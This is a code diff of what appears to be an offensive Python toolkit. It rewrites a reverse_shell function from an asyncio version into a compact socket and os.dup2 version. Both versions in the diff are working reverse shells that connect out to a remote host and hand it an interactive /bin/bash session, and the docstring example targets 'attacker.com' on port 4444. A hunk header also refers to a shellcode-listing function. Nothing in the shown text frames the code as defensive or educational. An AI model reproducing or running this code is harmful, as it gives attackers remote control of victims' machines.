@@ -1,4 +1,4 @@
-import asyncio
+import os
 import socket
 import subprocess
 
@@ -129,11 +129,11 @@ def generate_shellcode_list(arch: str = "x86", platform: str = "linux") -> list[
     return shellcode.get(key, [])
 
 
-async def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
-    """Create an async reverse shell that connects to a remote host.
+def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
+    """Create a reverse shell that connects to a remote host.
 
     Establishes a connection to a remote host and executes a shell,
-    forwarding input/output asynchronously between the connection and shell.
+    forwarding input/output between the connection and shell.
 
     Args:
         host: Remote host to connect to
@@ -141,31 +141,12 @@ async def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
         shell: Shell executable to run (default: '/bin/bash')
 
     Example:
-        >>> await reverse_shell('attacker.com', 4444)
+        >>> reverse_shell('attacker.com', 4444)
     """
-    reader, writer = await asyncio.open_connection(host, port)
-
-    process = await asyncio.create_subprocess_exec(
-        shell,
-        stdin=asyncio.subprocess.PIPE,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE,
-    )
-
-    async def forward_output():
-        while True:
-            data = await process.stdout.read(4096)
-            if not data:
-                break
-            writer.write(data)
-            await writer.drain()
-
-    async def forward_input():
-        while True:
-            data = await reader.read(4096)
-            if not data:
-                break
-            process.stdin.write(data)
-            await process.stdin.drain()
-
-    await asyncio.gather(forward_output(), forward_input())
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.Popen([shell, "-i"])
+    p.wait()
